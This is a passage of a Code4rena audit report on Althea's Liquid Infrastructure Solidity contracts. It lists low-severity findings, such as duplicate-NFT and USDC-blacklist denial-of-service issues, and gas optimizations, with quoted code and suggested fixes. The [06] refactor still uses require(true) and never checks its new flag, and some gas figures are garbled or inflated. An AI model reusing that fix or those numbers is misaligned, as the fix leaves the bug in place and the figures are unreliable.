*The following wardens also submitted reports: [TheSavageTeddy](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/458), [MrPotatoMagic](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/382), [peanuts](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/303), [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/51), [0xSmartContractSamurai](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/721), [jesjupyter](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/585), [DarkTower](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/571), [zhaojohnson](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/308), and [lsaudit](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/305).*

## [01] Check for ERC20 balances before releasing the managed NFT

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L413C2-L434C6

### Impact

The `releaseManagedNFT` function transfers the NFT to a selected address. It, however, doesn't check or withdraw the ERC20 token balances in the NFT before transferring. Doing this can lead to loss of these tokens if they had not been withdrawn from the NFT before transfer. 

```
 function releaseManagedNFT(
        address nftContract,
        address to
    ) public onlyOwner nonReentrant {
        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);
        nft.transferFrom(address(this), to, nft.AccountId());

        // Remove the released NFT from the collection
        for (uint i = 0; i < ManagedNFTs.length; i++) {
            address managed = ManagedNFTs[i];
            if (managed == nftContract) {
                // Delete by copying in the last element and then pop the end
                ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];
                ManagedNFTs.pop();
                break;
            }
        }
        // By this point the NFT should have been found and removed from ManagedNFTs
        require(true, "unable to find released NFT in ManagedNFTs");

        emit ReleaseManagedNFT(nftContract, to);
    }
```

### Recommended Mitigation Steps

Consider adding a check for the `withdrawERC20s` balance and a call to the `withdrawFromManagedNFTs` function before transferring the NFT.

## [02] Add a check for `0` `numWithdrawals` when withdrawing from NFTs

### Lines of code
 
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L359C14-L359C37

### Impact

The `withdrawFromManagedNFTs` function withdraws token from the managed NFTs to the liquidInfrastructureErc20 token contract. It, however, lacks a check for `0` `numWithdrawals` which can lead to the function running without actually doing anything. 

```

    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
        require(!LockedForDistribution, "cannot withdraw during distribution");

        if (nextWithdrawal == 0) {
            emit WithdrawalStarted();
        }

        uint256 limit = Math.min(
            numWithdrawals + nextWithdrawal,
            ManagedNFTs.length
        );
        uint256 i;
        for (i = nextWithdrawal; i < limit; i++) {
            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
                ManagedNFTs[i]
            );

            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
            emit Withdrawal(address(withdrawFrom));
        }
        nextWithdrawal = i;

        if (nextWithdrawal == ManagedNFTs.length) {
            nextWithdrawal = 0;
            emit WithdrawalFinished();
        }
    }
```

### Recommended Mitigation Steps

Consider adding a `0` check and reverting if there are no NFTs to withdraw from.


## [03] Redundant deletion of `erc20EntitlementPerUnit`

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L266<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L291

### Impact

Upon distribution start and end, the `erc20EntitlementPerUnit` is deleted, making one of the checks redundant. Consider deleting one of them, preferably the one in the `_endDistribution` function.

```
    function _beginDistribution() internal {
        require(
            !LockedForDistribution,
            "cannot begin distribution when already locked"
        );
        LockedForDistribution = true;

        // clear the previous entitlements, if any
        if (erc20EntitlementPerUnit.length > 0) {
            delete erc20EntitlementPerUnit;
        }
```
```
    function _endDistribution() internal {
        require(
            LockedForDistribution,
            "cannot end distribution when not locked"
        );
        delete erc20EntitlementPerUnit;
        LockedForDistribution = false;
        LastDistribution = block.number;
        emit DistributionFinished();
    }
```

## [04] Redundant check in the `distributeToAllHolders` function should be removed

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L184C1-L189C6<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L199

### Impact

The `distributeToAllHolders` function makes a check to see if number of holders is more than zero, upon which it calls the `distribute` function.

```
    function distributeToAllHolders() public {
        uint256 num = holders.length;
        if (num > 0) {
            distribute(holders.length);
        }
    }
```

The check is not needed as the `distribute` function also checks for non zero `numnumDistributions`. 

```
  function distribute(uint256 numDistributions) public nonReentrant {
        require(numDistributions > 0, "must process at least 1 distribution");
        ...
```

Consider removing the check and passing the values indirectly.

## [05] `addManagedNFT` and constructor should include a check for duplicate NFTs

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L394C1-L403C6<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L413C1-L434C6<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L359C1-L386C6

### Impact

Minor impact is that gas will be burned during zero amount transfers. Major impact is a DOS upon calling the `withdrawFromManagedNFTs` function after the NFT is released.

The `addManagedNFT` function allows the owner to add the LiquidInfrastructureNFTs to the list of managed NFTs, upon which the NFT is added to the list of the protocols's NFTs. The function and the constructor lacks sanity checks, which can cause that NFTs can be duplicated.

```
    function addManagedNFT(address nftContract) public onlyOwner {
        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);
        address nftOwner = nft.ownerOf(nft.AccountId());
        require(
            nftOwner == address(this),
            "this contract does not own the new ManagedNFT"
        );
        ManagedNFTs.push(nftContract);
        emit AddManagedNFT(nftContract);
    }
```

```
    constructor(
        string memory _name,
        string memory _symbol,
        address[] memory _managedNFTs,
        address[] memory _approvedHolders,
        uint256 _minDistributionPeriod,
        address[] memory _distributableErc20s
    ) ERC20(_name, _symbol) Ownable() {
        ManagedNFTs = _managedNFTs;
        LastDistribution = block.number;

        for (uint i = 0; i < _approvedHolders.length; i++) {
            HolderAllowlist[_approvedHolders[i]] = true;
        }

        MinDistributionPeriod = _minDistributionPeriod;

        distributableERC20s = _distributableErc20s;

        emit Deployed();

    }
```

For the minor impact, upon calling the `withdrawFromAllManagedNFTs`/`withdrawFromManagedNFTs` function, the `withdrawBalancesTo` function is called in the `LiquidInfrastructureNFT` contract:

```
    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
        ...
        for (i = nextWithdrawal; i < limit; i++) {
            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
                ManagedNFTs[i]
            );

            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
            emit Withdrawal(address(withdrawFrom));
        }
```
```
    function _withdrawBalancesTo(
        address[] calldata erc20s,
        address destination
    ) internal {
        uint256[] memory amounts = new uint256[](erc20s.length);
        for (uint i = 0; i < erc20s.length; i++) {
            address erc20 = erc20s[i];
            uint256 balance = IERC20(erc20).balanceOf(address(this));
            if (balance > 0) {
                bool result = IERC20(erc20).transfer(destination, balance);
                require(result, "unsuccessful withdrawal");
                amounts[i] = balance;
            }
        }
        emit SuccessfulWithdrawal(destination, erc20s, amounts);
    }
```

After the withdrawal from the first duplicate, the ERC20 balance is `0`, so the withdrawals from the second/subsequent duplicates are skipped.

For the more major impact, first the `releaseManagedNFT` is called. This transfers the NFT, then deletes the NFT from the array of `managedNFTs`. However, due to the use of the `break` functionality, it doesn't have a loop through the entire array of NFTs, but rather stops at the first discovered NFT (I.E., the first duplicate), leaving the remaining duplicates in the `managedNFTs` array. 

```
    function releaseManagedNFT(
        address nftContract,
        address to
    ) public onlyOwner nonReentrant {
        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);
        nft.transferFrom(address(this), to, nft.AccountId());

        // Remove the released NFT from the collection
        for (uint i = 0; i < ManagedNFTs.length; i++) {
            address managed = ManagedNFTs[i];
            if (managed == nftContract) {
                // Delete by copying in the last element and then pop the end
                ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];
                ManagedNFTs.pop();
                break;
            }
        }
        // By this point the NFT should have been found and removed from ManagedNFTs
        require(true, "unable to find released NFT in ManagedNFTs");

        emit ReleaseManagedNFT(nftContract, to);
    }
```

Now, it's important to note that the NFT transfer transfers the ownership to the other address, causing the LiquidInfrastructureERC20 contract to no longer be the token owner.

Upon calling `withdrawFromAllManagedNFTs`/`withdrawFromManagedNFTs` function, the `withdrawBalancesTo` function is called in the `LiquidInfrastructureNFT` contract. The `withdrawBalancesTo` function can only be called by the owner or an approved user. Hence, the `LiquidInfrastructureERC20` contract will not be able to call this contract, thus dossing the NFT balance withdrawal process. 

```
    function withdrawBalancesTo(
        address[] calldata erc20s,
        address destination
    ) public virtual {
        require(
            _isApprovedOrOwner(_msgSender(), AccountId),
            "caller is not the owner of the Account token and is not approved either"
        );
        _withdrawBalancesTo(erc20s, destination);
    }
```

This duplicate token can also not be removed by calling the `releaseManagedNFT` function, as the `transferFrom` function has to be called by either the owner or an approved user. 

Ultimately, this depends on the owners mistake, but can have serious effects in the protocol, so I'd leave this up to the judge.

### Recommended Mitigation Steps

Consider adding checks for duplications, or removing the `break` functionality from the `releaseManagedNFT` function, to allow for full looping and full removal of all duplicates.

## [06] Ineffective check in the `releaseNFT` function

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L431

### Impact

This check is redundant and does not serve any purpose as it always evaluates to true. It should ideally check if the NFT was successfully removed from `ManagedNFTs`, but it is incorrectly written.

```
   function releaseManagedNFT(
        address nftContract,
        address to
    ) public onlyOwner nonReentrant {
...
        require(true, "unable to find released NFT in ManagedNFTs");
        emit ReleaseManagedNFT(nftContract, to);
    }
```

### Recommended Mitigation Steps

Consider refactoring to something like this:

```

    function releaseManagedNFT(
        address nftContract,
        address to
    ) public onlyOwner nonReentrant {
        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);
        nft.transferFrom(address(this), to, nft.AccountId());
        bool foundAndRemoved = false;  
        // Remove the released NFT from the collection
        for (uint i = 0; i < ManagedNFTs.length; i++) {
            address managed = ManagedNFTs[i];
            if (managed == nftContract) {
                // Delete by copying in the last element and then pop the end
                ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];
                ManagedNFTs.pop();
                foundAndRemoved = true;
                break;
            }
        }
        // By this point the NFT should have been found and removed from ManagedNFTs
        require(true, "unable to find released NFT in ManagedNFTs");

        emit ReleaseManagedNFT(nftContract, to);
    }
```


## [07] Tokens can be lost in the contract if the `withdrawERC20s` are not set as `distributableERC20s` 

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L473<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L441C1-L445C6<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol#L108C1-L125C6<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L377

### Impact

The constructor and the `setDistributableERC20s` allows the owner of the LiquidInfrastructureERC20 contract to set the ERC20 reward tokens to distribute. 

```
    function setDistributableERC20s(
        address[] memory _distributableERC20s
    ) public onlyOwner {
        distributableERC20s = _distributableERC20s;
    }
```
```
    constructor(
        string memory _name,
        string memory _symbol,
        address[] memory _managedNFTs,
        address[] memory _approvedHolders,
        uint256 _minDistributionPeriod,
        address[] memory _distributableErc20s
    ) ERC20(_name, _symbol) Ownable() {
```

The owner of the LiquidInfrastructureNFT contract also has the ability to set the ERC20s as thresholds:

```
    function setThresholds(
        address[] calldata newErc20s,
        uint256[] calldata newAmounts
    ) public virtual onlyOwnerOrApproved(AccountId) {
        require(
            newErc20s.length == newAmounts.length,
            "threshold values must have the same length"
        );
        // Clear the thresholds before overwriting
        delete thresholdErc20s;
        delete thresholdAmounts;

        for (uint i = 0; i < newErc20s.length; i++) {
            thresholdErc20s.push(newErc20s[i]);
            thresholdAmounts.push(newAmounts[i]);
        }
        emit ThresholdsChanged(newErc20s, newAmounts);
    }
```

Which can later be withdrawn into the LiquidInfrastructureERC20 contract:

```
    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {
        require(!LockedForDistribution, "cannot withdraw during distribution");

        if (nextWithdrawal == 0) {
            emit WithdrawalStarted();
        }

        uint256 limit = Math.min(
            numWithdrawals + nextWithdrawal,
            ManagedNFTs.length
        );
        uint256 i;
        for (i = nextWithdrawal; i < limit; i++) {
            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(
                ManagedNFTs[i]
            );

            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();
            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));
            emit Withdrawal(address(withdrawFrom));
        }
        nextWithdrawal = i;

        if (nextWithdrawal == ManagedNFTs.length) {
            nextWithdrawal = 0;
            emit WithdrawalFinished();
        }
    }
```

As there's no specific check, or enforcements that the `withdrawERC20s` are also set as parts of the `distributableERC20s`, these tokens being withdrawn into the LiquidInfrastructureERC20 stand the risk of being stranded if they're not made distributable, as there's no other way to retrieve tokens from the contract.

### Recommended Mitigation Steps

Consider introducing a sweep function in the LiquidInfrastructureERC20 contract, or adding and using the `getThresholds` function, to get the array of `withdrawERC20s` and enforcing them as part of the `distributableERC20s`.

## [08] Contracts cannot be upgraded

### Lines of code

https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L50C1-L54C41<br>
https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L4C1-L12C1

### Impact

The `LiquidInfrastructureERC20` has a version and judging by the comment, it seems the contracts are intended to be upgradeable, so as to seamlessly make updates to the contract while introducing a new version. 

```
    /**
     * @notice This is the current version of the contract. Every update to the contract will introduce a new
     * version, regardless of anticipated compatibility.
     */
    uint256 public constant Version = 1;
```

But the contract doesn't inherit any upgradeable OZ contracts, nor storage gaps:

```
import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./LiquidInfrastructureNFT.sol";
```

### Recommended Mitigation Steps

If upgradeability is truly desired, inherit the upgradeable OZ contracts, and add storage gaps.

## [[09] Rewards distribution can be dossed if recipient is blocked by USDC/USDT](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/62)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/58#issuecomment-1985548589), this downgraded issue from the same warden has been included in this report for completeness.*

### Lines of code

 https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/bd6ee47162368e1999a0a5b8b17b701347cf9a7d/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L224

### Impact

USDC & USDT implement blacklisting feature to block suspicious users. This can become an issue if one of the approved holders is blacklisted by these tokens as reward distributions are processed in an array. The token transfer to these users will fail and will also brick the distribution system because the blacklisted user is never cleared.

### Proof of Concept

USDC implements a [blacklist function](https://etherscan.io/address/0x43506849d7c04f9138d1a2050bbf3a0c054402dd#code#F15#L71) and these accounts cannot [receive](https://etherscan.io/address/0x43506849d7c04f9138d1a2050bbf3a0c054402dd#code#F14#L285) USDC:

```
    function blacklist(address _account) external onlyBlacklister {
        _blacklist(_account);
        emit Blacklisted(_account);
    }
```
```
    function transfer(address to, uint256 value)
        external
        override
        whenNotPaused
        notBlacklisted(msg.sender)
        notBlacklisted(to)
        returns (bool)
    {
        _transfer(msg.sender, to, value);
        return true;
    }
```

The reward distribution is handled in a loop, causing the holder unable to receive the reward, the transfer will not be cleared and the contract will be left DOS'd. A malicious holder can also use this as a point of attack by intentionally getting himself blacklisted.

```
  function distribute(uint256 numDistributions) public nonReentrant {
        ...
        for (i = nextDistributionRecipient; i < limit; i++) {
            address recipient = holders[i];
            if (isApprovedHolder(recipient)) {
                uint256[] memory receipts = new uint256[](
                    distributableERC20s.length
                );
                for (uint j = 0; j < distributableERC20s.length; j++) {
                    IERC20 toDistribute = IERC20(distributableERC20s[j]);
                    uint256 entitlement = erc20EntitlementPerUnit[j] *
                        this.balanceOf(recipient);
                    if (toDistribute.transfer(recipient, entitlement)) { //@note
                        receipts[j] = entitlement;
                    }
                }

                emit Distribution(recipient, distributableERC20s, receipts);
            }
        }
        nextDistributionRecipient = i;

        if (nextDistributionRecipient == holders.length) {
            _endDistribution();
        }
    }
```

### Recommended Mitigation Steps

The best solution is to implement a two step withdrawal process in which, the rewards distribution loop increases the user's entitlement, then a second `claim` function with which a user can claim their rewards.

## Assessed type

DoS

**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/58#issuecomment-1985723292):**
> [01] - Low<br>
> [02] - Refactor<br>
> [03] - Refactor<br>
> [04] - Refactor<br>
> [05] - Low<br>
> [06] - Low<br>
> [07] - Low<br>
> [08] - Refactor<br>
> [09] - Low

***

# Gas Optimizations

For this audit, 4 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/712) by **0x11singh99** received the top score from the judge.

*The following wardens also submitted reports: [dharma09](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/723), [0xSmartContractSamurai](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/722), and [c3phas](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/531).*


| ID | Issue | Total Gas Saved |
| ---------- | ---------- | :------------------: |
| [G&#8209;01] | Cache `erc20EntitlementPerUnit` and `distributableERC20s` storage arrays in memory outside of nested for loops to avoid multiple `Gwarmsload` for every `i` value | Mentioned in finding |
| [G&#8209;02] | State variables can be packed into fewer storage slot | ~2000 |
| [G&#8209;03] | Unnecessary `nonReentrant` modifier checks in functions | ~24000 |
| [G&#8209;04] | Use already `cached` value instead of re-reading from `storage` | ~100 |
| [G&#8209;05] | No need to `inherit` `ERC721` again | - |
| [G&#8209;06] | `Remove` unnecessary `require` statements | ~115 |

## [G-01] Cache `erc20EntitlementPerUnit` and `distributableERC20s` storage arrays in memory outside of nested for loops to avoid multiple `Gwarmsload` for every `i` value.

Two `for` loops are nested here, so the internal `for` loop will run `distributableERC20s.length` times for every `i` value. That means every element in `distributableERC20s` and `distributableERC20s.length` elements in `erc20EntitlementPerUnit` array will be accessed for `limit - nextDistributionRecipient` times (ie. for each `i` value).

By caching those arrays outside of both loops, this can result in accessing those array's `distributableERC20s.length` number of starting elements only one times instead of multiple times.

It can save total `2 * limit - nextDistributionRecipient - 1 * distributableERC20s.length` `SLOAD`. Which can save ~100 Gas on avoiding each SLOAD when accessed after first time. Since each `SLOAD` costs 100 Gas while each MLOAD takes only 3 Gas.

Total Gas Saved: `2 \ limit - nextDistributionRecipient - 1 * distributableERC20s.length = 97`.

```solidity
File : contracts/LiquidInfrastructureERC20.sol

214:        for (i = nextDistributionRecipient; i < limit; i++) {
215:            address recipient = holders[i];
216:            if (isApprovedHolder(recipient)) {
217:                uint256[] memory receipts = new uint256[](
218:                    distributableERC20s.length
219:                );
220:                for (uint j = 0; j < distributableERC20s.length; j++) {
221:                    IERC20 toDistribute = IERC20(distributableERC20s[j]);
                      //@audit cache `erc20EntitlementPerUnit` and `distributableERC20s` outside from here and access here from memory
222:                    uint256 entitlement = erc20EntitlementPerUnit[j] *
223:                        this.balanceOf(recipient);
224:                    if (toDistribute.transfer(recipient, entitlement)) {
225:                        receipts[j] = entitlement;
226:                    }
227:                }
228:
229:                emit Distribution(recipient, distributableERC20s, receipts);
230:            }
231:        }
```

### Recommended Mitigation Steps

```diff
+           uint256[] memory m_erc20EntitlementPerUnit = new uint256[](distributableERC20s.length);
+           address[] memory m_distributableERC20s = new address[](distributableERC20s.length);
+           m_erc20EntitlementPerUnit = erc20EntitlementPerUnit;
+           m_distributableERC20s = distributableERC20s;

214:        for (i = nextDistributionRecipient; i < limit; i++) {
215:            address recipient = holders[i];
216:            if (isApprovedHolder(recipient)) {
217:                uint256[] memory receipts = new uint256[](
218:                    distributableERC20s.length
219:                );
220:                for (uint j = 0; j < distributableERC20s.length; j++) {
- 221:                    IERC20 toDistribute = IERC20(distributableERC20s[j]);
- 222:                    uint256 entitlement = erc20EntitlementPerUnit[j] *
+ 221:                    IERC20 toDistribute = IERC20(m_distributableERC20s[j]);
+ 222:                    uint256 entitlement = m_erc20EntitlementPerUnit[j] *
223:                        this.balanceOf(recipient);
224:                    if (toDistribute.transfer(recipient, entitlement)) {
225:                        receipts[j] = entitlement;
226:                    }
227:                }
228:
229:                emit Distribution(recipient, distributableERC20s, receipts);
230:            }
231:        }
```

[LiquidInfrastructureERC20.sol#L214C1-L231C10](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L214C1-L231C10)

## [G-02] State variables can be packed into fewer storage slot

Total Gas Saved: `2000 GAS, 1 SLOT`.

If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper when accessed in same transaction.

### `LastDistribution` and `LockedForDistribution` can be packed in `single` slot 

**`LastDistribution`** - can be reduced to `uint48` since it holds block number so uint48 is more than sufficient to hold any realistic block number of any blockchain.

*Note: This only includes an instance which was missed by bot. `MinDistributionPeriod` already covered in bot report, so it wasn't included here. While `LastDistribution` reducing size is not covered in bot report and it is major gas saving so it is covered here.*

```solidity
File : contracts/LiquidInfrastructureERC20.sol

70:    uint256 public LastDistribution;

75:    uint256 public MinDistributionPeriod;

80:    bool public LockedForDistribution;
```

[LiquidInfrastructureERC20.sol#L70-L80](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L70-L80)

### Recommended Mitigation Steps

```diff
File : contracts/LiquidInfrastructureERC20.sol

-70:    uint256 public LastDistribution;

75:     uint256 public MinDistributionPeriod;

+       uint48 public LastDistribution;
80:     bool public LockedForDistribution;
```

## [G-03] Unnecessary `nonReentrant` modifier checks in functions

Total Gas Saved: ~24000 GAS when every time respective function called.

Remove the unnecessary `nonReentrant` modifier since this function does not contain any external calls, and it is not invoked within the `_mint` function flow. This function `mint` not called again in `_mint` flow; also not in overridden `_beforeTokenTransfer` and `_afterTokenTransfer`, so there is no chance of reentrancy in this context. The `_mint` function, which is part of the OpenZeppelin library, it includes hooks before and after token transfer, and they do not involve any external calls in their overridden functions and `_mint` already doesn't have any external calls. Removing the `nonReentrant` modifier results in a gas saving of approximately ~24700 gas.

```solidity
File : contracts/LiquidInfrastructureERC20.sol

318: function mint(
319:    address account,
320:    uint256 amount
321:   ) public onlyOwner nonReentrant {
322:     _mint(account, amount);
323:    }
```

[LiquidInfrastructureERC20.sol#L318C4-L323C6](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L318C4-L323C6)

### Recommended Mitigation Steps

```diff
File : contracts/LiquidInfrastructureERC20.sol

318: function mint(
319:    address account,
320:    uint256 amount
-321:   ) public onlyOwner nonReentrant {
+321:   ) public onlyOwner  {
322:     _mint(account, amount);
323:    }
```

## [G-04] Use already `cached` value instead of re-reading from `storage`

Reading state variable from storage takes 100 Gas in other consecutive after first access. To avoid 1 `SLOAD`, we can use already cached value.

*Note: This only includes the instance which were missed by bot*

Total Gas Saved: ~100 Gas.

```solidity
File : liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol

184:    function distributeToAllHolders() public {
185:          uint256 num = holders.length;
186:          if (num > 0) {
187:              distribute(holders.length);
188:          }
189:      }
```

[LiquidInfrastructureERC20.sol#L184C4-L189C6](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L184C4-L189C6)

### Recommended Mitigation Steps

```diff
File : liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol

    function distributeToAllHolders() public {
        uint256 num = holders.length;
        if (num > 0) {
-            distribute(holders.length);
+            distribute(num);
        }
    }
```

## [G-05] No need to `inherit` `ERC721` again

Since `OwnableApprovableERC721` already inherits `ERC721`, there's no need to inherit `ERC721` again in `LiquidInfrastructureNFT` contract.

```solidity
20: abstract contract OwnableApprovableERC721 is Context, ERC721 {
```

Additionally, removing the unnecessary import of `ERC721` above will streamline the code.

```solidity
File : contracts/LiquidInfrastructureNFT.sol

5:  import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

...

33: contract LiquidInfrastructureNFT is ERC721, OwnableApprovableERC721 {
```

[LiquidInfrastructureNFT.sol#L5C1-L33C70](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol#L5C1-L33C70)<br>
[OwnableApprovableERC721.sol#L20](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/OwnableApprovableERC721.sol#L20)

### Recommended Mitigation steps

```diff
File : contracts/LiquidInfrastructureNFT.sol

-5:  import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

...

-33: contract LiquidInfrastructureNFT is ERC721, OwnableApprovableERC721 {
+33: contract LiquidInfrastructureNFT is  OwnableApprovableERC721 {
```

## [G-06] `Remove` unnecessary `require` statements

### Instance #1

Saves ~115 Gas every time the `_beginDistribution` function is called.

Since `_beginDistribution` function is called only once inside `distribute` when `LockedForDistribution` is false, `LockedForDistribution` will always be false when `_beginDistribution` will be called. There is no requirement of `require` check in `_beginDistribution` starting at line 258. This can save 1 `SLOAD` (~100 Gas), 1 `NOT` opcode (~3 gas) and 1 require check which will always be true (~15 Gas).

```solidity
File : contracts/LiquidInfrastructureERC20.sol

      function distribute(uint256 numDistributions) public nonReentrant {
200:        if (!LockedForDistribution) {
201:            require(
202:                _isPastMinDistributionPeriod(),
203:                "MinDistributionPeriod not met"
204:            );
205:            _beginDistribution();
206:        }
```

Remove the below require statement:

```solidity
File : contracts/LiquidInfrastructureERC20.sol

257:    function _beginDistribution() internal {
258:        require(
259:            !LockedForDistribution,
260:            "cannot begin distribution when already locked"
263:        );//@audit gas remove this unnecessary require
264:        LockedForDistribution = true;
```

[LiquidInfrastructureERC20.sol#L200C1-L206C10](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L200C1-L206C10)<br>
[LiquidInfrastructureERC20.sol#L257C5-L262C38](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L257C5-L262C38)

### Instance #2

`require` will never revert here so remove it. It doesn't have any utility, only wasting little gas in executing and always pass.

```solidity
File : contracts/LiquidInfrastructureERC20.sol

431: require(true, "unable to find released NFT in ManagedNFTs");
```

[LiquidInfrastructureERC20.sol#L431](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L431)

```diff
File : contracts/LiquidInfrastructureERC20.sol

- 431: require(true, "unable to find released NFT in ManagedNFTs");
```

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/712).*

***

# Audit Analysis

For this audit, 10 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/701) by **0xAadi** received the top score from the judge.

